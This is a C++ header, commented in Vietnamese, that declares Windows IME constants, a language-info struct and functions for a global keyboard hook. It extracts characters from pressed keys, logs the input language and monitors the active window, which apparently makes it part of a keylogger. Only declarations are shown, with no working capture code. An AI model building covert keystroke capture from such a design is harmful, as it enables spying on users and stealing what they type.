#pragma once
#include "common.h"

// Các hằng số định nghĩa trạng thái IME
#define IME_CMODE_ALPHANUMERIC    0x0000
#define IME_CMODE_NATIVE          0x0001
#define IME_CMODE_CHINESE         IME_CMODE_NATIVE
#define IME_CMODE_HANGEUL         IME_CMODE_NATIVE
#define IME_CMODE_JAPANESE        IME_CMODE_NATIVE
#define IME_CMODE_KATAKANA        0x0002  // Nhật Bản - Katakana
#define IME_CMODE_HIRAGANA        0x0004  // Nhật Bản - Hiragana
#define IME_CMODE_FULLSHAPE       0x0008  // Chữ toàn chiều rộng
#define IME_CMODE_ROMAN           0x0010  // Chế độ Roman
#define IME_CMODE_CHARCODE        0x0020
#define IME_CMODE_HANJACONVERT    0x0040  // Chuyển đổi Hanja
#define IME_CMODE_SOFTKBD         0x0080  // Bàn phím mềm
#define IME_CMODE_NOCONVERSION    0x0100  // Không chuyển đổi
#define IME_CMODE_EUDC            0x0200  // Ký tự do người dùng định nghĩa
#define IME_CMODE_SYMBOL          0x0400  // Ký hiệu
#define IME_CMODE_FIXED           0x0800  // Fixed co

// Cấu trúc để xác định ngôn ngữ hiện tại
struct LanguageInfo {
    LANGID languageId;       // ID ngôn ngữ
    HKL keyboardLayout;      // Layout bàn phím
    bool isImeActive;        // IME có đang hoạt động không
    DWORD imeConvMode;       // Chế độ chuyển đổi IME
    std::wstring currentComposition; // Chuỗi đang soạn thảo
    bool isComposing;        // Đang trong quá trình soạn thảo
};

extern HHOOK g_imeHook;
// Lấy thông tin ngôn ngữ hiện tại
LanguageInfo GetCurrentLanguageInfo();

// Kiểm tra xem có phải đang sử dụng bộ gõ IME không
bool IsImeLanguage(HKL keyboardLayout);

// Xác định tên ngôn ngữ hiện tại
std::wstring GetLanguageName(LANGID languageId);

// Chuyển đổi chuỗi UTF-16 sang UTF-8
inline std::string Utf16ToUtf8(const std::wstring& wstr);

// Chuyển đổi chuỗi UTF-8 sang UTF-16
inline std::wstring Utf8ToUtf16(const std::string& str);

// Thêm hook để theo dõi sự kiện IME
LRESULT CALLBACK ImeHookProc(int nCode, WPARAM wParam, LPARAM lParam);

// Điều chỉnh hàm Write để hỗ trợ Unicode 
void WriteUnicode(const std::wstring& wstr);

// Cập nhật trạng thái IME
void UpdateImeStatus();

// Trích xuất ký tự Unicode từ phím đã nhấn
std::wstring ExtractUnicodeCharFromKey(WPARAM virtualKey, BYTE keyState[256]);

void LogCurrentLanguage();

void MonitorActiveWindow();